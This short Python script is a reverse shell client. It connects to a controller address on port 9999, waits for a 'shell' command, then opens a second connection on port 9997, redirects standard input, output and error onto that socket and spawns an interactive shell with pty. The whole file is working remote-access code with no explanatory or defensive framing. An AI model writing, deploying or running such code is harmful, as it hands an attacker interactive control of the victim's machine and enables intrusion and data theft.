import os
from socket import socket, AF_INET, SOCK_STREAM
from time import sleep

 
ip = "0.0.0.0"
a = socket(AF_INET, SOCK_STREAM)
a.connect((ip, 9999))

def shell():
    import pty, os
    d = socket(AF_INET, SOCK_STREAM)
    d.connect((ip, 9997))
    os.dup2(d.fileno(), 0)
    os.dup2(d.fileno(), 1)
    os.dup2(d.fileno(), 2)
    pty.spawn(f"{os.getenv('SHELL')}")

def buffer():
    while True:
        try:
            inputs = ["shell", "cmd"]
            funcs = [shell]
            sleep(1)
            data = a.recv(1024).decode()
            if data == "":
                a.close()
                continue
            if data in inputs:
                funcs[inputs.index(data)]()
        except Exception as e:
            print(e)
            a.close()
            return



buffer()
